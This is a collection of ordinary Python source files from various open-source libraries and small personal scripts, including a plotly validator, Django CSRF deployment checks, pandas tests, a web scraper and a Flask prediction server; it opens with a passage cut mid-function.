    return (r >> 32), (r & ((1 << 32) - 1))


def intranges_contain(int_: int, ranges: Tuple[int, ...]) -> bool:
    """"""Determine if `int_` falls into one of the ranges in `ranges`.""""""
    tuple_ = _encode_range(int_, 0)
    pos = bisect.bisect_left(ranges, tuple_)
    # we could be immediately ahead of a tuple (start, end)
    # with start < int_ <= end
    if pos > 0:
        left, right = _decode_range(ranges[pos-1])
        if left <= int_ < right:
            return True
    # or we could be immediately behind a tuple (int_, end)
    if pos < len(ranges):
        left, _ = _decode_range(ranges[pos])
        if left == int_:
            return True
    return False"
JD379	JD379-_insidetextfont.py	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""insidetextfont"", parent_name=""funnelarea"", **kwargs
    ):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY50	JY50-_structures.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.
from __future__ import absolute_import, division, print_function


class InfinityType(object):
    def __repr__(self):
        # type: () -> str
        return ""Infinity""

    def __hash__(self):
        # type: () -> int
        return hash(repr(self))

    def __lt__(self, other):
        # type: (object) -> bool
        return False

    def __le__(self, other):
        # type: (object) -> bool
        return False

    def __eq__(self, other):
        # type: (object) -> bool
        return isinstance(other, self.__class__)

    def __ne__(self, other):
        # type: (object) -> bool
        return not isinstance(other, self.__class__)

    def __gt__(self, other):
        # type: (object) -> bool
        return True

    def __ge__(self, other):
        # type: (object) -> bool
        return True

    def __neg__(self):
        # type: (object) -> NegativeInfinityType
        return NegativeInfinity


Infinity = InfinityType()


class NegativeInfinityType(object):
    def __repr__(self):
        # type: () -> str
        return ""-Infinity""

    def __hash__(self):
        # type: () -> int
        return hash(repr(self))

    def __lt__(self, other):
        # type: (object) -> bool
        return True

    def __le__(self, other):
        # type: (object) -> bool
        return True

    def __eq__(self, other):
        # type: (object) -> bool
        return isinstance(other, self.__class__)

    def __ne__(self, other):
        # type: (object) -> bool
        return not isinstance(other, self.__class__)

    def __gt__(self, other):
        # type: (object) -> bool
        return False

    def __ge__(self, other):
        # type: (object) -> bool
        return False

    def __neg__(self):
        # type: (object) -> InfinityType
        return Infinity


NegativeInfinity = NegativeInfinityType()"
JD303	JD303-csrf.py	"import inspect

from django.conf import settings

from .. import Error, Tags, Warning, register

W003 = Warning(
    ""You don't appear to be using Django's built-in ""
    ""cross-site request forgery protection via the middleware ""
    ""('django.middleware.csrf.CsrfViewMiddleware' is not in your ""
    ""MIDDLEWARE). Enabling the middleware is the safest approach ""
    ""to ensure you don't leave any holes."",
    id=""security.W003"",
)

W016 = Warning(
    ""You have 'django.middleware.csrf.CsrfViewMiddleware' in your ""
    ""MIDDLEWARE, but you have not set CSRF_COOKIE_SECURE to True. ""
    ""Using a secure-only CSRF cookie makes it more difficult for network ""
    ""traffic sniffers to steal the CSRF token."",
    id=""security.W016"",
)


def _csrf_middleware():
    return ""django.middleware.csrf.CsrfViewMiddleware"" in settings.MIDDLEWARE


@register(Tags.security, deploy=True)
def check_csrf_middleware(app_configs, **kwargs):
    passed_check = _csrf_middleware()
    return [] if passed_check else [W003]


@register(Tags.security, deploy=True)
def check_csrf_cookie_secure(app_configs, **kwargs):
    passed_check = (
        settings.CSRF_USE_SESSIONS
        or not _csrf_middleware()
        or settings.CSRF_COOKIE_SECURE is True
    )
    return [] if passed_check else [W016]


@register(Tags.security)
def check_csrf_failure_view(app_configs, **kwargs):
    from django.middleware.csrf import _get_failure_view

    errors = []
    try:
        view = _get_failure_view()
    except ImportError:
        msg = (
            ""The CSRF failure view '%s' could not be imported.""
            % settings.CSRF_FAILURE_VIEW
        )
        errors.append(Error(msg, id=""security.E102""))
    else:
        try:
            inspect.signature(view).bind(None, reason=None)
        except TypeError:
            msg = (
                ""The CSRF failure view '%s' does not take the correct number of ""
                ""arguments."" % settings.CSRF_FAILURE_VIEW
            )
            errors.append(Error(msg, id=""security.E101""))
    return errors"
JY249	JY249-MSVSToolFile.py	"# Copyright (c) 2012 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""Visual Studio project reader/writer.""""""

import gyp.easy_xml as easy_xml


class Writer:
    """"""Visual Studio XML tool file writer.""""""

    def __init__(self, tool_file_path, name):
        """"""Initializes the tool file.

    Args:
      tool_file_path: Path to the tool file.
      name: Name of the tool file.
    """"""
        self.tool_file_path = tool_file_path
        self.name = name
        self.rules_section = [""Rules""]

    def AddCustomBuildRule(
        self, name, cmd, description, additional_dependencies, outputs, extensions
    ):
        """"""Adds a rule to the tool file.

    Args:
      name: Name of the rule.
      description: Description of the rule.
      cmd: Command line of the rule.
      additional_dependencies: other files which may trigger the rule.
      outputs: outputs of the rule.
      extensions: extensions handled by the rule.
    """"""
        rule = [
            ""CustomBuildRule"",
            {
                ""Name"": name,
                ""ExecutionDescription"": description,
                ""CommandLine"": cmd,
                ""Outputs"": "";"".join(outputs),
                ""FileExtensions"": "";"".join(extensions),
                ""AdditionalDependencies"": "";"".join(additional_dependencies),
            },
        ]
        self.rules_section.append(rule)

    def WriteIfChanged(self):
        """"""Writes the tool file.""""""
        content = [
            ""VisualStudioToolFile"",
            {""Version"": ""8.00"", ""Name"": self.name},
            self.rules_section,
        ]
        easy_xml.WriteXmlIfChanged(
            content, self.tool_file_path, encoding=""Windows-1252""
        )"
JD71	JD71-_entry_points.py	"import functools
import operator
import itertools

from .extern.jaraco.text import yield_lines
from .extern.jaraco.functools import pass_none
from ._importlib import metadata
from ._itertools import ensure_unique
from .extern.more_itertools import consume


def ensure_valid(ep):
    """"""
    Exercise one of the dynamic properties to trigger
    the pattern match.
    """"""
    ep.extras


def load_group(value, group):
    """"""
    Given a value of an entry point or series of entry points,
    return each as an EntryPoint.
    """"""
    # normalize to a single sequence of lines
    lines = yield_lines(value)
    text = f'[{group}]\n' + '\n'.join(lines)
    return metadata.EntryPoints._from_text(text)


def by_group_and_name(ep):
    return ep.group, ep.name


def validate(eps: metadata.EntryPoints):
    """"""
    Ensure entry points are unique by group and name and validate each.
    """"""
    consume(map(ensure_valid, ensure_unique(eps, key=by_group_and_name)))
    return eps


@functools.singledispatch
def load(eps):
    """"""
    Given a Distribution.entry_points, produce EntryPoints.
    """"""
    groups = itertools.chain.from_iterable(
        load_group(value, group)
        for group, value in eps.items())
    return validate(metadata.EntryPoints(groups))


@load.register(str)
def _(eps):
    r""""""
    >>> ep, = load('[console_scripts]\nfoo=bar')
    >>> ep.group
    'console_scripts'
    >>> ep.name
    'foo'
    >>> ep.value
    'bar'
    """"""
    return validate(metadata.EntryPoints(metadata.EntryPoints._from_text(eps)))


load.register(type(None), lambda x: x)


@pass_none
def render(eps: metadata.EntryPoints):
    by_group = operator.attrgetter('group')
    groups = itertools.groupby(sorted(eps, key=by_group), by_group)

    return '\n'.join(
        f'[{group}]\n{render_items(items)}\n'
        for group, items in groups
    )


def render_items(eps):
    return '\n'.join(
        f'{ep.name} = {ep.value}'
        for ep in sorted(eps)
    )"
JD123	JD123-__init__.py	"###############################################################################
#
# The MIT License (MIT)
#
# Copyright (c) typedef int GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the ""Software""), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
###############################################################################

from autobahn._version import __version__

version = __version__

import os
import txaio

# this is used in the unit tests (trial/pytest), and when already done here, there
# is no risk and headaches with finding out if/where an import implies a framework
if os.environ.get('USE_TWISTED', False) and os.environ.get('USE_ASYNCIO', False):
    raise RuntimeError('fatal: _both_ USE_TWISTED and USE_ASYNCIO are set!')

if os.environ.get('USE_TWISTED', False):
    txaio.use_twisted()
elif os.environ.get('USE_ASYNCIO', False):
    txaio.use_asyncio()
else:
    # neither USE_TWISTED nor USE_ASYNCIO selected from env var
    pass"
JD473	JD473-__init__.py	"# coding: utf-8

import functools
from ._version import version
from .exceptions import *
from ._packer import Packer as _Packer
from ._unpacker import unpackb as _unpackb
from ._unpacker import unpack as _unpack
from ._unpacker import Unpacker as _Unpacker
from ._ext_type import ExtType
from ._msgpack_numpy import encode_numpy as _encode_numpy
from ._msgpack_numpy import decode_numpy as _decode_numpy


# msgpack_numpy extensions
class Packer(_Packer):
    def __init__(self, *args, **kwargs):
        kwargs['default'] = functools.partial(_encode_numpy, chain=kwargs.get('default'))
        super(Packer, self).__init__(*args, **kwargs)


class Unpacker(_Unpacker):
    def __init__(self, *args, **kwargs):
        kwargs['object_hook'] = functools.partial(_decode_numpy, chain=kwargs.get('object_hook'))
        super(Unpacker, self).__init__(*args, **kwargs)


def pack(o, stream, **kwargs):
    """"""
    Pack an object and write it to a stream.
    """"""
    packer = Packer(**kwargs)
    stream.write(packer.pack(o))


def packb(o, **kwargs):
    """"""
    Pack an object and return the packed bytes.
    """"""
    return Packer(**kwargs).pack(o)


def unpack(stream, **kwargs):
    """"""
    Unpack a packed object from a stream.
    """"""
    if 'object_pairs_hook' not in kwargs:
        object_hook = kwargs.get('object_hook')
        kwargs['object_hook'] = functools.partial(_decode_numpy, chain=object_hook)
    return _unpack(stream, **kwargs)


def unpackb(packed, **kwargs):
    """"""
    Unpack a packed object.
    """"""
    if 'object_pairs_hook' not in kwargs:
        object_hook = kwargs.get('object_hook')
        kwargs['object_hook'] = functools.partial(_decode_numpy, chain=object_hook)
    return _unpackb(packed, **kwargs)


# alias for compatibility to simplejson/marshal/pickle.
load = unpack
loads = unpackb

dump = pack
dumps = packb"
JD63	JD63-(Medium) 6331. Maximize Win From Two Segments.py	"from collections import defaultdict
from bisect import bisect_right, bisect_left


class Solution(object):
    def maximizeWin(self, prizePositions, k):
        """"""
        :type prizePositions: List[int]
        :type k: int
        :rtype: int
        """"""
        distinct = list(set(prizePositions))
        check = defaultdict(lambda: -1)
        for num in prizePositions:
            check[num] += 1

        prefixSum = defaultdict(lambda: 0)
        prefixSum[0] = 0
        temp = 0
        for num in distinct:
            temp += check[num]
            prefixSum[num] = temp

        # Th1: 2k
        res1 = 0
        for i in range(0, len(distinct)):
            pre = distinct[i]
            post = bisect_left(distinct, distinct[i]+2*k)
            print(post)

        print(res1)

        #Th2: overlap
        res2 = 0
        data = []
        for i in range(1, len(distinct)):
            pre = distinct[i-1]
            post = distinct[bisect_right(distinct, distinct[i]+k)-1]
            data.append((prefixSum[post]-prefixSum[pre], [pre+1, post]))
        data.sort(key=lambda x: x[0], reverse=True)
        res2 += data[0][0]
        left = data[0][1][0]
        right = data[0][1][1]

        newData = [0]
        for i in range(1, len(distinct)):
            pre = distinct[i-1]
            post = distinct[bisect_right(distinct, distinct[i]+k)-1]
            print(pre+1, post)

            if pre+1 >= left and post <= right:
                print('1111')
                continue
            elif right >= post >= left:
                print('22222')
                post = distinct[bisect_right(distinct, left-1)-1]
                print(post)
            elif pre+1 <= right <= post:
                print(""dcm"")
                pre = distinct[bisect_left(distinct, right+1)]
                print(pre, post)
            newData.append(prefixSum[post]-prefixSum[pre])
            print(pre+1, post, newData)


t = Solution()
print(t.maximizeWin([1, 1, 2, 2, 3, 3, 5], 2))"
JY439	JY439-testcode2.py	"from bs4 import BeautifulSoup
import requests
import pandas as pd

# URL of the web page containing the HTML table to scrape
url = 'https://hfr.health.gov.ng/facilities/hospitals-search?_token=bKwt6zu4Xch5Bwwp4Py4ZLm5izdLBnHron2Odcij&state_id=1&lga_id=1&ward_id=0&facility_level_id=0&ownership_id=0&operational_status_id=1&registration_status_id=0&license_status_id=0&geo_codes=0&service_type=0&service_category_id=0&facility_name=&entries_per_page=20'

# Initialize empty list to store all data
all_data = []

# Loop over all pages
while True:
    # Fetch the web page content using requests library
    page = requests.get(url).text

    # Create BeautifulSoup object from HTML
    soup = BeautifulSoup(page, 'html.parser')

    # Find the table element in the HTML
    table = soup.find('table')

    # Get the column names from the table header
    headers = []
    for th in table.find_all('th'):
        headers.append(th.text.strip())

    # Loop over each row in the table body and store the data in a list of dictionaries
    data = []
    for tr in table.find_all('tr'):
        row = {}
        for i, td in enumerate(tr.find_all('td')):
            row[headers[i]] = td.text.strip()
        if row:
            data.append(row)

    # Append the data from the current page to the list of all data
    all_data += data

    # Find the next page link (if any)
    next_link = soup.find('a', {'class': 'next'})
    if next_link:
        # If there is a next link, update the URL and continue to next page
        url = next_link['href']
    else:
        # If there is no next link, we're done scraping
        break

# Create pandas DataFrame from the list of dictionaries
df = pd.DataFrame(all_data)

# Print the resulting DataFrame
print(df)"
JD399	JD399-main.py	"# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from datetime import datetime
import os

from flask import Flask, request

from weather.data import get_inputs_patch
from weather.model import WeatherModel

app = Flask(__name__)

MODEL = WeatherModel.from_pretrained(""model"")


def to_bool(x: str) -> bool:
    return x.lower() == ""true""


@app.route(""/"")
def ping() -> dict:
    """"""Checks that we can communicate with the service and get arguments.""""""
    return {
        ""response"": ""✅ I got your request!"",
        ""args"": request.args,
    }


@app.route(""/predict/<iso_date>/<float(signed=True):lat>,<float(signed=True):lon>"")
def predict(iso_date: str, lat: float, lon: float) -> dict:
    # Optional HTTP request parameters.
    #   https://en.wikipedia.org/wiki/Query_string
    patch_size = request.args.get(""patch-size"", 128, type=int)
    include_inputs = request.args.get(""include-inputs"", False, type=to_bool)

    date = datetime.fromisoformat(iso_date)
    inputs = get_inputs_patch(date, (lon, lat), patch_size).tolist()
    predictions = MODEL.predict(inputs).tolist()

    if include_inputs:
        return {""inputs"": inputs, ""predictions"": predictions}
    return {""predictions"": predictions}


if __name__ == ""__main__"":
    app.run(debug=True, host=""0.0.0.0"", port=int(os.environ.get(""PORT"", 8080)))"
JD517	JD517-test_float.py	"""""""
Tests that work on both the Python and C engines but do not have a
specific classification into the other test modules.
""""""
from io import StringIO

import numpy as np
import pytest

from pandas.compat import is_platform_linux

from pandas import DataFrame
import pandas._testing as tm

pytestmark = pytest.mark.usefixtures(""pyarrow_skip"")


def test_float_parser(all_parsers):
    # see gh-9565
    parser = all_parsers
    data = ""45e-1,4.5,45.,inf,-inf""
    result = parser.read_csv(StringIO(data), header=None)

    expected = DataFrame([[float(s) for s in data.split("","")]])
    tm.assert_frame_equal(result, expected)


def test_scientific_no_exponent(all_parsers_all_precisions):
    # see gh-12215
    df = DataFrame.from_dict({""w"": [""2e""], ""x"": [""3E""], ""y"": [""42e""], ""z"": [""632E""]})
    data = df.to_csv(index=False)
    parser, precision = all_parsers_all_precisions

    df_roundtrip = parser.read_csv(StringIO(data), float_precision=precision)
    tm.assert_frame_equal(df_roundtrip, df)


@pytest.mark.parametrize(""neg_exp"", [-617, -100000, -99999999999999999])
def test_very_negative_exponent(all_parsers_all_precisions, neg_exp):
    # GH#38753
    parser, precision = all_parsers_all_precisions

    data = f""data\n10E{neg_exp}""
    result = parser.read_csv(StringIO(data), float_precision=precision)
    expected = DataFrame({""data"": [0.0]})
    tm.assert_frame_equal(result, expected)


@pytest.mark.parametrize(""exp"", [999999999999999999, -999999999999999999])
def test_too_many_exponent_digits(all_parsers_all_precisions, exp, request):
    # GH#38753
    parser, precision = all_parsers_all_precisions
    data = f""data\n10E{exp}""
    result = parser.read_csv(StringIO(data), float_precision=precision)
    if precision == ""round_trip"":
        if exp == 999999999999999999 and is_platform_linux():
            mark = pytest.mark.xfail(reason=""GH38794, on Linux gives object result"")
            request.node.add_marker(mark)

        value = np.inf if exp > 0 else 0.0
        expected = DataFrame({""data"": [value]})
    else:
        expected = DataFrame({""data"": [f""10E{exp}""]})

    tm.assert_frame_equal(result, expected)"
JD83	JD83-_text.py	"import re

from ._functools import method_cache


# from jaraco.text 3.5
class FoldedCase(str):
    """"""
    A case insensitive string class; behaves just like str
    except compares equal when the only variation is case.

    >>> s = FoldedCase('hello world')

    >>> s == 'Hello World'
    True

    >>> 'Hello World' == s
    True

    >>> s != 'Hello World'
    False

    >>> s.index('O')
    4

    >>> s.split('O')
    ['hell', ' w', 'rld']

    >>> sorted(map(FoldedCase, ['GAMMA', 'alpha', 'Beta']))
    ['alpha', 'Beta', 'GAMMA']

    Sequence membership is straightforward.

    >>> ""Hello World"" in [s]
    True
    >>> s in [""Hello World""]
    True

    You may test for set inclusion, but candidate and elements
    must both be folded.

    >>> FoldedCase(""Hello World"") in {s}
    True
    >>> s in {FoldedCase(""Hello World"")}
    True

    String inclusion works as long as the FoldedCase object
    is on the right.

    >>> ""hello"" in FoldedCase(""Hello World"")
    True

    But not if the FoldedCase object is on the left:

    >>> FoldedCase('hello') in 'Hello World'
    False

    In that case, use in_:

    >>> FoldedCase('hello').in_('Hello World')
    True

    >>> FoldedCase('hello') > FoldedCase('Hello')
    False
    """"""

    def __lt__(self, other):
        return self.lower() < other.lower()

    def __gt__(self, other):
        return self.lower() > other.lower()

    def __eq__(self, other):
        return self.lower() == other.lower()

    def __ne__(self, other):
        return self.lower() != other.lower()

    def __hash__(self):
        return hash(self.lower())

    def __contains__(self, other):
        return super().lower().__contains__(other.lower())

    def in_(self, other):
        ""Does self appear in other?""
        return self in FoldedCase(other)

    # cache lower since it's likely to be called frequently.
    @method_cache
    def lower(self):
        return super().lower()

    def index(self, sub):
        return self.lower().index(sub.lower())

    def split(self, splitter=' ', maxsplit=0):
        pattern = re.compile(re.escape(splitter), re.I)
        return pattern.split(self, maxsplit)"
JY450	JY450-test_reduction.py	"import numpy as np
import pytest

import pandas as pd


@pytest.fixture
def data():
    """"""Fixture returning boolean array, with valid and missing values.""""""
    return pd.array(
        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],
        dtype=""boolean"",
    )


@pytest.mark.parametrize(
    ""values, exp_any, exp_all, exp_any_noskip, exp_all_noskip"",
    [
        ([True, pd.NA], True, True, True, pd.NA),
        ([False, pd.NA], False, False, pd.NA, False),
        ([pd.NA], False, True, pd.NA, pd.NA),
        ([], False, True, False, True),
        # GH-33253: all True / all False values buggy with skipna=False
        ([True, True], True, True, True, True),
        ([False, False], False, False, False, False),
    ],
)
def test_any_all(values, exp_any, exp_all, exp_any_noskip, exp_all_noskip):
    # the methods return numpy scalars
    exp_any = pd.NA if exp_any is pd.NA else np.bool_(exp_any)
    exp_all = pd.NA if exp_all is pd.NA else np.bool_(exp_all)
    exp_any_noskip = pd.NA if exp_any_noskip is pd.NA else np.bool_(exp_any_noskip)
    exp_all_noskip = pd.NA if exp_all_noskip is pd.NA else np.bool_(exp_all_noskip)

    for con in [pd.array, pd.Series]:
        a = con(values, dtype=""boolean"")
        assert a.any() is exp_any
        assert a.all() is exp_all
        assert a.any(skipna=False) is exp_any_noskip
        assert a.all(skipna=False) is exp_all_noskip

        assert np.any(a.any()) is exp_any
        assert np.all(a.all()) is exp_all


@pytest.mark.parametrize(""dropna"", [True, False])
def test_reductions_return_types(dropna, data, all_numeric_reductions):
    op = all_numeric_reductions
    s = pd.Series(data)
    if dropna:
        s = s.dropna()

    if op == ""sum"":
        assert isinstance(getattr(s, op)(), np.int_)
    elif op == ""prod"":
        assert isinstance(getattr(s, op)(), np.int_)
    elif op in (""min"", ""max""):
        assert isinstance(getattr(s, op)(), np.bool_)
    else:
        # ""mean"", ""std"", ""var"", ""median"", ""kurt"", ""skew""
        assert isinstance(getattr(s, op)(), np.float64)"
JD79	JD79-rfc6032.py	"#
# This file is part of pyasn1-modules software.
#
# Created by Russ Housley with assistance from asn1ate v.0.6.0.
#
# Copyright (c) 2019, Vigil Security, LLC
# License: http://snmplabs.com/pyasn1/license.html
#
# CMS Encrypted Key Package Content Type
#
# ASN.1 source from:
# https://www.rfc-editor.org/rfc/rfc6032.txt
#

from pyasn1.type import namedtype
from pyasn1.type import tag
from pyasn1.type import univ

from pyasn1_modules import rfc5652
from pyasn1_modules import rfc5083


# Content Decryption Key Identifier attribute

id_aa_KP_contentDecryptKeyID = univ.ObjectIdentifier('2.16.840.1.101.2.1.5.66')

class ContentDecryptKeyID(univ.OctetString):
    pass

aa_content_decrypt_key_identifier = rfc5652.Attribute()
aa_content_decrypt_key_identifier['attrType'] = id_aa_KP_contentDecryptKeyID
aa_content_decrypt_key_identifier['attrValues'][0] = ContentDecryptKeyID()


# Encrypted Key Package Content Type

id_ct_KP_encryptedKeyPkg = univ.ObjectIdentifier('2.16.840.1.101.2.1.2.78.2')

class EncryptedKeyPackage(univ.Choice):
    pass

EncryptedKeyPackage.componentType = namedtype.NamedTypes(
    namedtype.NamedType('encrypted', rfc5652.EncryptedData()),
    namedtype.NamedType('enveloped', rfc5652.EnvelopedData().subtype(
        implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0))),
    namedtype.NamedType('authEnveloped', rfc5083.AuthEnvelopedData().subtype(
        implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 1)))
)


# Map of Attribute Type OIDs to Attributes are
# added to the ones that are in rfc5652.py

_cmsAttributesMapUpdate = {
    id_aa_KP_contentDecryptKeyID: ContentDecryptKeyID(),
}

rfc5652.cmsAttributesMap.update(_cmsAttributesMapUpdate)


# Map of Content Type OIDs to Content Types are
# added to the ones that are in rfc5652.py

_cmsContentTypesMapUpdate = {
    id_ct_KP_encryptedKeyPkg: EncryptedKeyPackage(),
}

rfc5652.cmsContentTypesMap.update(_cmsContentTypesMapUpdate)"
JY513	JY513-__init__.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome.components.light.types import AddressableLightEffect
from esphome.components.light.effects import register_addressable_effect
from esphome.const import CONF_ID, CONF_NAME, CONF_METHOD, CONF_CHANNELS

DEPENDENCIES = [""network""]

e131_ns = cg.esphome_ns.namespace(""e131"")
E131AddressableLightEffect = e131_ns.class_(
    ""E131AddressableLightEffect"", AddressableLightEffect
)
E131Component = e131_ns.class_(""E131Component"", cg.Component)

METHODS = {""UNICAST"": e131_ns.E131_UNICAST, ""MULTICAST"": e131_ns.E131_MULTICAST}

CHANNELS = {
    ""MONO"": e131_ns.E131_MONO,
    ""RGB"": e131_ns.E131_RGB,
    ""RGBW"": e131_ns.E131_RGBW,
}

CONF_UNIVERSE = ""universe""
CONF_E131_ID = ""e131_id""

CONFIG_SCHEMA = cv.All(
    cv.Schema(
        {
            cv.GenerateID(): cv.declare_id(E131Component),
            cv.Optional(CONF_METHOD, default=""MULTICAST""): cv.one_of(
                *METHODS, upper=True
            ),
        }
    ),
    cv.only_with_arduino,
)


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_ID])
    await cg.register_component(var, config)
    cg.add(var.set_method(METHODS[config[CONF_METHOD]]))


@register_addressable_effect(
    ""e131"",
    E131AddressableLightEffect,
    ""E1.31"",
    {
        cv.GenerateID(CONF_E131_ID): cv.use_id(E131Component),
        cv.Required(CONF_UNIVERSE): cv.int_range(min=1, max=512),
        cv.Optional(CONF_CHANNELS, default=""RGB""): cv.one_of(*CHANNELS, upper=True),
    },
)
async def e131_light_effect_to_code(config, effect_id):
    parent = await cg.get_variable(config[CONF_E131_ID])

    effect = cg.new_Pvariable(effect_id, config[CONF_NAME])
    cg.add(effect.set_first_universe(config[CONF_UNIVERSE]))
    cg.add(effect.set_channels(CHANNELS[config[CONF_CHANNELS]]))
    cg.add(effect.set_e131(parent))
    return effect"
JD87	JD87-__init__.py	"""""""rope refactor package

This package contains modules that perform python refactorings.
Refactoring classes perform refactorings in 4 steps:

1. Collect some data for performing the refactoring and use them
   to construct a refactoring class.  Like::

     renamer = Rename(project, resource, offset)

2. Some refactorings give you useful information about the
   refactoring after their construction.  Like::

     print(renamer.get_old_name())

3. Give the refactoring class more information about how to
   perform the refactoring and get the changes this refactoring is
   going to make.  This is done by calling `get_changes` method of the
   refactoring class.  Like::

     changes = renamer.get_changes(new_name)

4. You can commit the changes.  Like::

     project.do(changes)

These steps are like the steps IDEs usually do for performing a
refactoring.  These are the things an IDE does in each step:

1. Construct a refactoring object by giving it information like
   resource, offset and ... .  Some of the refactoring problems (like
   performing rename refactoring on language keywords) can be reported
   here.
2. Print some information about the refactoring and ask the user
   about the information that are necessary for completing the
   refactoring (like new name).
3. Call the `get_changes` by passing it information asked from
   the user (if necessary) and get and preview the changes returned by
   it.
4. perform the refactoring.

From ``0.5m5`` release the `get_changes()` method of some time-
consuming refactorings take an optional `rope.base.taskhandle.
TaskHandle` parameter.  You can use this object for stopping or
monitoring the progress of refactorings.

""""""
from rope.refactor.importutils import ImportOrganizer  # noqa
from rope.refactor.topackage import ModuleToPackage  # noqa

__all__ = [
    ""rename"",
    ""move"",
    ""inline"",
    ""extract"",
    ""restructure"",
    ""topackage"",
    ""importutils"",
    ""usefunction"",
    ""change_signature"",
    ""encapsulate_field"",
    ""introduce_factory"",
    ""introduce_parameter"",
    ""localtofield"",
    ""method_object"",
    ""multiproject"",
]"
JY375	JY375-lib2to3_ex.py	"""""""
Customized Mixin2to3 support:

 - adds support for converting doctests


This module raises an ImportError on Python 2.
""""""

from distutils.util import Mixin2to3 as _Mixin2to3
from distutils import log
from lib2to3.refactor import RefactoringTool, get_fixers_from_package

import setuptools


class DistutilsRefactoringTool(RefactoringTool):
    def log_error(self, msg, *args, **kw):
        log.error(msg, *args)

    def log_message(self, msg, *args):
        log.info(msg, *args)

    def log_debug(self, msg, *args):
        log.debug(msg, *args)


class Mixin2to3(_Mixin2to3):
    def run_2to3(self, files, doctests=False):
        # See of the distribution option has been set, otherwise check the
        # setuptools default.
        if self.distribution.use_2to3 is not True:
            return
        if not files:
            return
        log.info(""Fixing "" + "" "".join(files))
        self.__build_fixer_names()
        self.__exclude_fixers()
        if doctests:
            if setuptools.run_2to3_on_doctests:
                r = DistutilsRefactoringTool(self.fixer_names)
                r.refactor(files, write=True, doctests_only=True)
        else:
            _Mixin2to3.run_2to3(self, files)

    def __build_fixer_names(self):
        if self.fixer_names:
            return
        self.fixer_names = []
        for p in setuptools.lib2to3_fixer_packages:
            self.fixer_names.extend(get_fixers_from_package(p))
        if self.distribution.use_2to3_fixers is not None:
            for p in self.distribution.use_2to3_fixers:
                self.fixer_names.extend(get_fixers_from_package(p))

    def __exclude_fixers(self):
        excluded_fixers = getattr(self, 'exclude_fixers', [])
        if self.distribution.use_2to3_exclude_fixers is not None:
            excluded_fixers.extend(self.distribution.use_2to3_exclude_fixers)
        for fixer_name in excluded_fixers:
            if fixer_name in self.fixer_names:
                self.fixer_names.remove(fixer_name)"
JY172	JY172-metadata_legacy.py	"""""""Metadata generation logic for legacy source distributions.
""""""

import logging
import os

from pip._internal.build_env import BuildEnvironment
from pip._internal.exceptions import InstallationError
from pip._internal.utils.setuptools_build import make_setuptools_egg_info_args
from pip._internal.utils.subprocess import call_subprocess
from pip._internal.utils.temp_dir import TempDirectory

logger = logging.getLogger(__name__)


def _find_egg_info(directory):
    # type: (str) -> str
    """"""Find an .egg-info subdirectory in `directory`.
    """"""
    filenames = [
        f for f in os.listdir(directory) if f.endswith("".egg-info"")
    ]

    if not filenames:
        raise InstallationError(
            f""No .egg-info directory found in {directory}""
        )

    if len(filenames) > 1:
        raise InstallationError(
            ""More than one .egg-info directory found in {}"".format(
                directory
            )
        )

    return os.path.join(directory, filenames[0])


def generate_metadata(
    build_env,  # type: BuildEnvironment
    setup_py_path,  # type: str
    source_dir,  # type: str
    isolated,  # type: bool
    details,  # type: str
):
    # type: (...) -> str
    """"""Generate metadata using setup.py-based defacto mechanisms.

    Returns the generated metadata directory.
    """"""
    logger.debug(
        'Running setup.py (path:%s) egg_info for package %s',
        setup_py_path, details,
    )

    egg_info_dir = TempDirectory(
        kind=""pip-egg-info"", globally_managed=True
    ).path

